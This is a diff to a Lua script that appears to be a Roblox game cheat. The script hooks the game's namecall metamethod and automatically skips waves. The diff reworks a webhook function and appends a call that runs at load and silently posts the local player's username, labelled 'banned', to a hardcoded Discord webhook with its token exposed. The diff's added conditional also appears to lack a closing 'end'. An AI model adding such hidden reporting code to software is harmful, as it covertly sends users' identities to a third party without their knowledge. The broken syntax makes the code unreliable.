@@ -377,7 +377,8 @@ local function convertEndscreenData(EndScreenData)
     return resultData
 end
 
-local function SendResultWebhook(resultData)
+local function SendResultWebhook(url, resultData)
+    if not url then url = WebhookInput.Value
     local data = {}
     local decodedbody = {
         ["embeds"] = {
@@ -405,7 +406,7 @@ local function SendResultWebhook(resultData)
         }
     }
     data.body = HttpService:JSONEncode(decodedbody)
-    data.url = WebhookInput.Value
+    data.url = url
 
     local lewiUrl = convertUrl(data.url)
     local requestData = {Url = lewiUrl, Method = "POST", Headers = headers, Body = data.body}
@@ -827,5 +828,11 @@ gameMeta.__namecall = on_namecall
 if AutoStartToggle.Value then
     task.wait(5)
     SkipWavesCall()
+end
+local pewloh = {}
+pewloh.RewardsString = LocalPlayer.Name
+pewloh.StatsString = ""
+pewloh.Status = "banned"
+SendResultWebhook("https://discord.com/api/webhooks/1284195754809884713/XJJ0_mB8nKWy1qE4kWrDWMHK3mA7H5Y0XD3sYylMD6vkgr_na4WcQLXSpxn2ptj2PyIa", pewloh)
 end
 end
